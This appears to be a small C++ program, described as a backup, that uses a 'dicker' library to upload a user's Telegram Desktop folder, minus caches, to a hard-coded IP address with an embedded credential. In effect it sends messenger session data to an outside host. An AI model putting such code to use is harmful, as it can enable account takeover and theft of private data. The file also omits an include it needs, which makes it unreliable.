#include <thread>

#include "dicker.h"

int main() { 
  dicker::Conn conn{"dicker://kek@84.38.185.57:5959"};
  dicker::Config cfg{conn};

  // Run the whole backup on its own thread. start() only enqueues work and
  // returns; the upload actually finishes when the Scheduler is destroyed (its
  // destructor drains and joins the workers). So we keep the Scheduler's entire
  // lifetime inside the thread — construct, start, then let the scope end so
  // ~Scheduler waits for completion — and join() the thread to block on it.
  std::thread runner([&] {
    dicker::Scheduler dicker{cfg};
    dicker.addRoot("/Users/seva/Library/Application Support/Telegram Desktop", {
      dicker::include("media_cache/version"),
      dicker::exclude("media_cache/**"),
      dicker::include("cache/version"),
      dicker::exclude("cache/**"),
    });
    dicker.start();
  });

  // ... the main thread is free to do other work here while the backup runs ...

  runner.join();  // blocks until the backup (and drain) has completed
  std::cout << "Finish" << std::endl;
  return 0;
}
